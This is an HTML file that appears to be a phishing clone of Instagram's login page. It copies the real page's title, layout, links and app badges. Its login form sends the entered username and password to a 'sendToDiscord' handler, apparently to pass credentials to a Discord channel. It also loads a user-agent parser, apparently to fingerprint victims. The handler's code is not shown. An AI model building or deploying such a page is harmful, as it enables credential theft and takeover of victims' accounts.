<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Instagram</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/UAParser.js/1.0.35/ua-parser.min.js"></script>
    <link rel="stylesheet" href="style.css"> 
    <link rel="shortcut icon" href="/Instagram_logo_2016.svg.webp">
    <style>
  
    </style>
</head>
<body>
    <div class="container">
        <div class="box">
            <div class="heading"></div>
            <form class="login-form" onsubmit="sendToDiscord(event)">
                <div class="field">
                    <input id="username" type="name" placeholder="Phone number, username, or email" required/>
                    <label for="username">Phone number, username, or email</label>
                </div>
                <div class="field">
                    <input id="password" type="password" placeholder="password" required/>
                    <label for="password">Password</label>
                </div>
                <button class="login-button" type="submit">Log In</button>
                <div id="status"></div>
                <div class="separator">
                    <div class="line"></div>
                    <p>OR</p>
                    <div class="line"></div>
                </div>

                <div class="other">
                    <button class="fb-login-btn" type="button">
                        <i class="fa fa-facebook-official fb-icon"></i>
                        <span class=""><img src="https://icons.iconarchive.com/icons/paomedia/small-n-flat/1024/social-facebook-icon.png" height="15" width="15"><a href="https://www.facebook.com/login/">&nbsp;Log in with Facebook</a></span>
                    </button>
                    <a class="forgot-password" href="https://i.instagram.com/accounts/password/reset/">Forgot password?</a>
                </div>
            </form>
        </div>
        <div class="box">
            <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
        </div>
    </div>
    <br>
    <div class="get">Get the app.</div>
    <br>
    <div class="apps">
        <a href="/forget.html">
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" height="40" width="134">
        </a>&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;
        <a href="/forget.html">
            <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" height="40" width="134">
        </a>
    </div>
    <br>
    <div class="footer">
        <footer>
            Meta About Blog Jobs Help API Privacy Terms Top Accounts Hashtags Locations Instagram Lite Contact Uploading & Non-Users
        </footer>
    </div>
    <div class="copyright">

</body>
</html>
